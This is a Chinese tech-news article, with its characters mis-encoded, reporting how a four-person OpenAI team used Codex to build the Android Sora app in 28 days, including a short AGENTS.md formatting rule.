            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ–°æ™ºå…ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:21:51.000Z" title="Mon Dec 15 2025 10:21:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2ce71d3345f496c95c6091704190c3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=hYU6Bf1OJ7Enf6oV7oqE4%2BflzB0%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>ã€Œã€æ–°æ™ºå…ƒå¯¼è¯»ã€‘OpenAI çˆ†æ¬¾ APPï¼ŒåªåŠ¨ç”¨äº†å››å‘˜æ‚å°†ã€‚ä»–ä»¬åœ¨çŸ­çŸ­ 28 å¤©å†…ï¼Œå®Œæˆäº†ä» 0 æ­å»ºå®‰å“ç‰ˆ Soraã€‚è¿™èƒŒåï¼Œç«Ÿæ˜¯ AI å®Œæˆäº† 85% çš„ç¼–ç ã€‚ã€</strong></h5>
<p>4 äºº 28 å¤©æ‰‹æ“ Sora APPï¼Œçº¦ 85% ä»£ç ç«Ÿæ˜¯ AI å†™çš„ï¼</p>
<p>10 æœˆåˆï¼ŒOpenAI é‡ç£…å‘å¸ƒè¿­ä»£å Sora 2ï¼Œä»¥åŠé¦–ä¸ª AI è§†é¢‘åº”ç”¨ Sora APPã€‚</p>
<p>ç›´åˆ° 11 æœˆï¼Œå®‰å“ç‰ˆ Sora ä¸€ç»ä¸Šçº¿ï¼Œå°±ç™»ä¸Šäº†è°·æ­Œ Play Store æ¦œé¦–ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcef7b4aff1143dcb9baa782aa6ff87b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=CI1BatltL%2FC8DyarHy8qWew5wTM%3D" alt="" loading="lazy"/></p>
<p>å®‰å“ç”¨æˆ·åœ¨ 24h å†…ï¼Œç”Ÿæˆäº†è¶… 100 ä¸‡æ¡è§†é¢‘</p>
<p>æ—¶éš”ä¸¤ä¸ªæœˆï¼ŒOpenAI å›¢é˜Ÿæ­ç§˜è¿™æ¬¾çˆ†ç«åº”ç”¨ï¼ˆé¦–ä¸ªå®‰å“ç‰ˆï¼‰ï¼Œå¦‚ä½•æ„å»ºçš„èƒŒåæ•…äº‹ã€‚</p>
<p>è®©äººæ„å¤–çš„æ˜¯ï¼Œè¿™æ¬¾ APP ä»…åœ¨ 28 å¤©å†…å®Œæˆï¼ŒèƒŒåæœ€å¤§åŠŸè‡£ä¾¿æ˜¯ AI æ™ºèƒ½ä½“â€”â€”Codexã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94b375a3ac544020ac1b2eb06d70f662~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=BmPRCPWYsQ9MyQHf9c7bwhjC9BE%3D" alt="" loading="lazy"/></p>
<p>ä» 10 æœˆ 8 æ—¥åˆ° 11 æœˆ 5 æ—¥ï¼Œ4 äººå·¥ç¨‹å›¢é˜Ÿä¸ Codex åä½œï¼Œæ¶ˆè€—çº¦ 50 äº¿ Tokenï¼Œå°±æŠŠ Sora Android æ¨å‘å…¨çƒã€‚</p>
<p>å°½ç®¡åº”ç”¨è§„æ¨¡è™½å¤§ï¼Œå´å®ç°äº† 99.9% æ— å´©æºƒç‡ã€‚</p>
<p>è€Œä¸”ï¼Œä»–ä»¬è¿˜ä½¿ç”¨çš„æ˜¯ GPT-5.1-Codex æ¨¡å‹çš„æ—©æœŸç‰ˆæœ¬ã€‚</p>
<p>å‘å¸ƒä»… 5 ä¸ªæœˆçš„æ—¶é—´ï¼ŒCodex å·²ç»æ‰¿åŒ…äº† OpenAI å†…éƒ¨æ¯å‘¨ 70% çš„ PR äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d841105b2794a7ab82d06df9cba1197~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=U0M0SmjNxrqtBfaA9Y1yB%2Bk1BQk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97b1c778c7544d5892b9b77be2aa2953~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=JxRfXpaSJEjS7TZwmx251H%2FBNgQ%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œæ‹¥æŠ± ã€Œå¸ƒé²å…‹æ–¯å®šå¾‹ã€ï¼šä¿æŒçµæ´»ï¼Œå”¯å¿«ä¸ç ´ã€</strong></p>
<p>å½“ Sora åœ¨ iOS ä¸Šå‘å¸ƒæ—¶ï¼Œç”¨æˆ·é‡ç›´æ¥åŸåœ°çˆ†ç‚¸ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3dc9cf18fc4b4e048a21983331bb1115~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=7hrTE4sDid1Y66m12G6bkzoJYok%3D" alt="" loading="lazy"/></p>
<p>ç›¸æ¯”ä¹‹ä¸‹ï¼Œå®‰å“å½“æ—¶åªæœ‰ä¸€ä¸ªç®€é™‹çš„å†…éƒ¨åŸå‹ï¼Œè€Œåœ¨ Google Play ä¸Šé¢„æ³¨å†Œçš„ç”¨æˆ·å´åœ¨è¶Šå †è¶Šå¤šã€‚</p>
<p>é¢å¯¹è¿™ç§é«˜å‹ã€ç«çƒ§çœ‰æ¯›çš„å‘å¸ƒä»»åŠ¡ï¼Œé€šå¸¸çš„ååº”å°±æ˜¯ç–¯ç‹‚å †äººã€åŠ æµç¨‹ã€‚</p>
<p>åƒè¿™ç§è§„æ¨¡å’Œè´¨é‡çš„ç”Ÿäº§çº§åº”ç”¨ï¼Œé€šå¸¸å¾—ä¸€å¤§å¸®å·¥ç¨‹å¸ˆå¹²å¥½å‡ ä¸ªæœˆï¼Œè€Œä¸”è¿˜ä¼šè¢«å„ç§åè°ƒå·¥ä½œæ‹–æ…¢è¿›åº¦ã€‚</p>
<p>ç¾å›½è®¡ç®—æœºæ¶æ„å¸ˆ Fred Brooks æ›¾æœ‰ä¸€å¥åè¨€ï¼Œã€Œå‘ä¸€ä¸ªå·²ç»å»¶æœŸçš„è½¯ä»¶é¡¹ç›®å¢åŠ äººæ‰‹ï¼Œåªä¼šè®©å®ƒå»¶å¾—æ›´å‰å®³ã€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5c89a88c8dd492794e4951513ae3ca2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=WjAlqFAUQd9citxdUc9QWc3SqCs%3D" alt="" loading="lazy"/></p>
<p>æ¢å¥è¯è¯´ï¼Œæƒ³è¦å¿«é€Ÿäº¤ä»˜ä¸€ä¸ªå¤æ‚é¡¹ç›®æ—¶ï¼Œå †äººå¾€å¾€å¢åŠ äº†æ²Ÿé€šæˆæœ¬ã€ä»»åŠ¡ç¢ç‰‡åŒ–å’Œé›†æˆéš¾åº¦ï¼Œåè€Œä¼šé™ä½æ•ˆç‡ã€‚</p>
<p>ä¸ºæ­¤ï¼ŒOpenAI ç»„å»ºäº†ä¸€æ”¯åªæœ‰å››åå·¥ç¨‹å¸ˆçš„ã€Œç²¾é”å°é˜Ÿã€â€”â€”å…¨å‘˜é…å¤‡ Codexï¼Œæå¤§åœ°æŠŠæ¯ä¸ªäººçš„æˆ˜æ–—åŠ›æ‹‰æ»¡ã€‚</p>
<p>é ç€è¿™ç§æ‰“æ³•ï¼Œåœ¨ 18 å¤©å†…å°±å‘å‘˜å·¥å‘å¸ƒäº† Sora Android çš„å†…éƒ¨æ„å»ºç‰ˆæœ¬ï¼Œä»…ä»… 10 å¤©åå°±å‘å…¬ä¼—æ­£å¼å‘å¸ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12fa5b8136ed4fae8a603ca6f0f83dfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=JxcS7d8UYCCtLRavdixznile04I%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a86f18221534f0cad1929212df11b9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=3KIEfAOUGQGYIwx0D%2BkMtD%2F1nyo%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25f9fe42e9014cc888487cbe02d30494~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=9luUqRV58r2zds1%2BEVXdPMNBLhU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16c45040b6104ba6882d7485bb593ba8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=ARxZXY5EY3eT5RLGRenkiahrX7c%3D" alt="" loading="lazy"/></p>
<p><strong>ã€ŒAI è¿­ä»£ AIï¼Œè‡ªæˆ‘è¿›åŒ–ã€</strong></p>
<p>åœ¨ OpenAI å†…éƒ¨ï¼Œç»å¤§éƒ¨åˆ†å·¥ç¨‹å¸ˆéƒ½åœ¨ç”¨ Codexï¼Œå³å¼€æºç‰ˆ CLIã€‚</p>
<p>Codex äº§å“è´Ÿè´£äºº Alexander Embiricos é€éœ²ï¼Œã€Œå®ƒä¼šç›‘æ§è‡ªå·±çš„è®­ç»ƒè¿‡ç¨‹ï¼Œå¹¶å¤„ç†ç”¨æˆ·åé¦ˆï¼Œã€Œå†³å®šã€ä¸‹ä¸€æ­¥è¯¥åšä»€ä¹ˆã€‚</p>
<p>Codex æ­£åœ¨ç»™è‡ªå·±çš„è®­ç»ƒè¿è¡Œç¼–å†™å¤§é‡çš„ç ”ç©¶æµ‹è¯•æ¡†æ¶ï¼ˆresearch harnessï¼‰ï¼ŒOpenAI ç”šè‡³åœ¨å°è¯•è®© Codex å»ç›‘æ§è‡ªå·±çš„è®­ç»ƒè¿‡ç¨‹ã€‚</p>
<p>è¿™ç§ã€Œå¥—å¨ƒã€å¼çš„å¼€å‘æ¨¡å¼ï¼Œå¯ä»¥è®© Codex è‡ªæˆ‘è¿­ä»£ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f96627c00d940a8a3401250f9eb97c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=pVf9lms5XOfeR144H4fyyoMvdRg%3D" alt="" loading="lazy"/></p>
<p>è¿™ç§ç”¨å·¥å…·é€ æ›´å¥½å·¥å…·çš„é€’å½’å¾ªç¯ï¼Œåœ¨è®¡ç®—å†å²ä¸Šå…¶å®ç”±æ¥å·²ä¹…ã€‚</p>
<p>1960 å¹´ä»£ï¼Œå·¥ç¨‹å¸ˆä»¬åœ¨çº¸ä¸Šæ‰‹å·¥è®¾è®¡äº†ç¬¬ä¸€æ‰¹é›†æˆç”µè·¯ï¼Œç„¶åæ ¹æ®å›¾çº¸é€ å‡ºäº†ç‰©ç†èŠ¯ç‰‡ã€‚</p>
<p>æ¥ç€ï¼Œè¿™äº›èŠ¯ç‰‡åˆé©±åŠ¨äº†è¿è¡Œç¬¬ä¸€æ‰¹ç”µå­è®¾è®¡è‡ªåŠ¨åŒ–ï¼ˆEDAï¼‰è½¯ä»¶çš„ç”µè„‘ï¼Œè€Œè¿™äº›è½¯ä»¶åè¿‡æ¥åˆè®©å·¥ç¨‹å¸ˆèƒ½è®¾è®¡å‡ºäººç±»æ‰‹ç»˜æ ¹æœ¬æä¸å®šçš„å¤æ‚ç”µè·¯ã€‚</p>
<p>ç°ä»£å¤„ç†å™¨åŒ…å«æ•°åäº¿ä¸ªæ™¶ä½“ç®¡ï¼Œè¿™ç§æ’åˆ—æ¨¡å¼ä¹‹æ‰€ä»¥èƒ½å­˜åœ¨ï¼Œå…¨é è½¯ä»¶ã€‚</p>
<p>OpenAI ç”¨ Codex æ¥é€  Codex ä¼¼ä¹ä¹Ÿæ˜¯è¿™ä¸ªè·¯å­ï¼šæ¯ä¸€ä»£å·¥å…·åˆ›é€ çš„èƒ½åŠ›ï¼Œéƒ½ä¼šåå“ºåˆ°ä¸‹ä¸€ä»£ä¸­ã€‚</p>
<p>è¿™ä¸ªç³»ç»Ÿèƒ½è‡ªä¸»è¿è¡Œè®¸å¤šè¿›ç¨‹ï¼Œå¤„ç†åé¦ˆï¼Œè¡ç”Ÿå¹¶ç®¡ç†å­è¿›ç¨‹ï¼Œè¿˜èƒ½ç”Ÿæˆæœ€ç»ˆå‘å¸ƒåœ¨å®é™…äº§å“é‡Œçš„ä»£ç ã€‚</p>
<p>OpenAI å‘˜å·¥ç®¡å®ƒå«ã€Œé˜Ÿå‹ã€ï¼Œå¹¶ä¸”ç”¨è¯¸å¦‚ Linearã€Slack ç­‰å·¥å…·æ¥ç»™å®ƒæ´¾æ´»å„¿ã€‚</p>
<p>Codex å¤„ç†çš„ä»»åŠ¡ï¼Œåˆ°åº•ç®—ä¸ç®—çœŸæ­£çš„ã€Œå†³ç­–ã€ï¼Ÿ</p>
<p>ä½†æ— å¯å¦è®¤çš„æ˜¯ï¼Œè¿™é‡Œå½¢æˆäº†ä¸€ä¸ªåŠè‡ªä¸»çš„åé¦ˆå¾ªç¯ï¼š</p>
<p>Codex åœ¨äººç±»çš„æŒ‡å¯¼ä¸‹å†™ä»£ç ï¼Œè¿™äº›ä»£ç å˜æˆäº† Codex çš„ä¸€éƒ¨åˆ†ï¼Œç»“æœå°±æ˜¯ä¸‹ä¸€ä¸ªç‰ˆæœ¬çš„ Codex ä¼šå†™å‡ºä¸ä¸€æ ·çš„ä»£ç ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9b128b16de54614ac72d88e4368bdbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=w6zl26UFCwooeMeiVKjcWGgw0Lw%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œä¸€ä½åˆšå…¥èŒçš„ã€Œé«˜çº§å·¥ç¨‹å¸ˆã€ã€</strong></p>
<p>ä¸ºäº†ç†è§£å·¥ç¨‹å¸ˆæ˜¯å¦‚ä½•è·Ÿ Codex é…åˆçš„ï¼Œéœ€å¾—å…ˆçŸ¥é“å®ƒå“ªé‡Œå¼ºã€å“ªé‡Œéœ€è¦äººå¸¦ã€‚</p>
<p>æŠŠå®ƒå½“æˆä¸€ä¸ªã€Œåˆšå…¥èŒçš„é«˜çº§å·¥ç¨‹å¸ˆã€æ˜¯ä¸ªå¾ˆå¥½çš„åˆ‡å…¥ç‚¹ã€‚</p>
<p>è¿™ä¸ªå®šä½ï¼Œæ„å‘³ç€å·¥ç¨‹å¸ˆå¯ä»¥æŠŠæ›´å¤šæ—¶é—´èŠ±åœ¨æŒ‡æŒ¥å’Œ Review ä»£ç ä¸Šï¼Œè€Œä¸æ˜¯è‡ªå·±åœ¨é‚£å„¿æ•²ä»£ç ã€‚</p>
<p>ä¸ã€Œæ°›å›´ç¼–ç¨‹ã€ä¸åŒçš„æ˜¯ï¼Œè®© Codex ç¼–ç å±äºã€ŒVibe engineeringã€ï¼ˆæ°›å›´æµå·¥ç¨‹ï¼‰çš„é¢†åŸŸã€‚</p>
<p>å‰è€…æ˜¯æŒ‡ï¼Œå¼€å‘è€…ä¸æ€ä¹ˆç»†çœ‹å°±ç›´æ¥æ¥å— AI ç”Ÿæˆçš„ä»£ç ï¼Œè€Œåè€…æ˜¯ AI ç ”ç©¶å‘˜ Simon Willison æå‡ºçš„æ¦‚å¿µï¼ŒæŒ‡äººç±»ä»ä¿æŒåœ¨å¾ªç¯ä¸­ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œè®© Codex å¹²æ´» / åˆ¶å®šè®¡åˆ’ï¼Œå†ä¸€èµ·è®¨è®ºï¼Œè¿­ä»£è®¡åˆ’ï¼Œè¿™æ ·å¼€å‘è€…å°±å’Œæ¨¡å‹ä¿æŒåœ¨ä¸€ä¸ªã€Œå¾ªç¯ã€é‡Œï¼Œè¿˜èƒ½ä»”ç»†å®¡æŸ¥ä»£ç ã€‚</p>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b08e40602ec443398f448ef237f61467~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=6DoL7wJc9zBoVPPCFWPDe%2F2FjTE%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€ŒCodex éœ€è¦æŒ‡å¯¼çš„åœ°æ–¹ã€</strong></p>
<p>ç›®å‰ï¼ŒCodex è¿˜ä¸æ“…é•¿æ¨æ–­æœªçŸ¥çš„äº‹ã€‚</p>
<p>æ¯”å¦‚ï¼Œä¸ªäººå–œæ¬¢çš„æ¶æ„æ¨¡å¼ã€äº§å“ç­–ç•¥ã€çœŸå®ç”¨æˆ·è¡Œä¸ºï¼Œä»¥åŠå†…éƒ¨çš„æ½œè§„åˆ™æˆ–æ·å¾„ã€‚</p>
<p>åŒæ ·ï¼ŒCodex ä¹Ÿçœ‹ä¸åˆ° App å®é™…è·‘èµ·æ¥çš„æ ·å­ï¼š</p>
<p>å®ƒæ²¡æ³•åœ¨çœŸæœºä¸Šæ‰“å¼€ Soraï¼Œæ„Ÿè§‰ä¸åˆ°æ»šåŠ¨æ¡æ˜¯ä¸æ˜¯ä¸ä¸æ»‘ï¼Œæˆ–è€…å¯Ÿè§‰åˆ°æŸä¸ªäº¤äº’æµç¨‹å¾ˆåˆ«æ‰­ã€‚</p>
<p>è¿™äº›ä½“éªŒå±‚é¢çš„æ´»å„¿ï¼Œåªèƒ½é  OpenAI å›¢é˜Ÿè‡ªå·±æ¥ã€‚</p>
<p>æ¯ä¸€ä¸ªå®ä¾‹éƒ½éœ€è¦ã€Œå…¥èŒåŸ¹è®­ã€ã€‚ç»™å‡ºä¸Šä¸‹æ–‡ï¼Œæ˜ç¡®ç›®æ ‡ã€çº¦æŸæ¡ä»¶ï¼Œä»¥åŠæ˜ç¡®çš„è§„çŸ©ï¼Œå¯¹äºè®© Codex æŠŠæ´»å„¿å¹²æ¼‚äº®è‡³å…³é‡è¦ã€‚</p>
<p>è¿˜æœ‰ï¼ŒCodex åœ¨æ·±å±‚æ¶æ„åˆ¤æ–­ä¸Šä¹Ÿå®¹æ˜“è·‘åï¼šå¦‚æœæ”¾ä»»ä¸ç®¡ï¼Œå®ƒå¯èƒ½ä¼šæå‡ºä¸€ä¸ªå¤šä½™çš„ ViewModelï¼Œå®é™…ä¸Šå›¢é˜Ÿåªæƒ³æ‰©å±•ç°æœ‰çš„é‚£ä¸ªï¼›æˆ–è€…æŠŠæœ¬è¯¥å±äº Repository å±‚çš„é€»è¾‘ç¡¬å¡è¿› UI å±‚ã€‚</p>
<p>å®ƒçš„æœ¬èƒ½æ˜¯æŠŠåŠŸèƒ½è·‘é€šå°±è¡Œï¼Œè€Œä¸æ˜¯ä¼˜å…ˆè€ƒè™‘é•¿æœŸçš„ä»£ç æ•´æ´åº¦ã€‚</p>
<p>OpenAI å‘ç°ï¼Œåœ¨æ•´ä¸ªä»£ç åº“é‡Œåˆ°å¤„æ”¾å¤§é‡çš„ AGENT.md æ–‡ä»¶éå¸¸æœ‰ç”¨ã€‚</p>
<p>è¿™èƒ½è®©å·¥ç¨‹å¸ˆåœ¨ä¸åŒçš„ä¼šè¯é‡Œï¼Œè½»æ¾å¤ç”¨ç›¸åŒçš„æŒ‡å¯¼å’Œæœ€ä½³å®è·µã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œä¸ºäº†ç¡®ä¿ Codex æŒ‰ç…§é£æ ¼æŒ‡å—å†™ä»£ç ï¼ŒOpenAI å›¢é˜Ÿåœ¨é¡¶å±‚çš„ AGENTS.md é‡ŒåŠ äº†è¿™ä¹ˆä¸€æ®µï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## Formatting and static checks</span>
<span class="hljs-bullet">-</span>Â <span class="hljs-strong">**Always run**</span>Â <span class="hljs-code">`./gradlew detektFix`</span>Â (or for the affected modules)Â <span class="hljs-strong">**before committing**</span>. CI will fail if formatting or detekt issues are present.
</code></pre>
<p><strong>ã€Œ<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d0d2431789643feba9da61651724922~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398910&amp;x-signature=MnseEUXJO5RkptMj0PevMpL8uXI%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€ŒCodex æ“…é•¿çš„åœ°æ–¹ã€</strong></p>
<p>æ¥ä¸‹æ¥ï¼Œå†æ¥çœ‹çœ‹ Codex æœ€æ“…é•¿ä»€ä¹ˆï¼Ÿ</p>
<ul>
<li>**ç§’æ‡‚å¤§å‹ä»£ç åº“ï¼š**Codex ç²¾é€šæ‰€æœ‰ä¸»æµç¼–ç¨‹è¯­è¨€ï¼Œä¸éœ€è¦æå¤æ‚çš„æŠ½è±¡ï¼Œå°±èƒ½è½»æ¾åœ°åœ¨ä¸åŒå¹³å°é—´å¤ç”¨ç›¸åŒçš„æ¦‚å¿µã€‚</li>
<li>**æµ‹è¯•è¦†ç›–ç‡ï¼š**Codex å¯¹å†™å•å…ƒæµ‹è¯•æœ‰ç€ç‹¬ç‰¹çš„çƒ­æƒ…ï¼Œèƒ½è¦†ç›–å„ç§è¾¹ç¼˜æƒ…å†µã€‚è™½è¯´ä¸æ˜¯æ¯ä¸ªæµ‹è¯•éƒ½å¾ˆæ·±ï¼Œä½†è¿™å¹¿æ’’ç½‘çš„è¦†ç›–ç‡å¯¹é˜²æ­¢ Bug å›å½’ç‰¹åˆ«æœ‰ç”¨ã€‚</li>
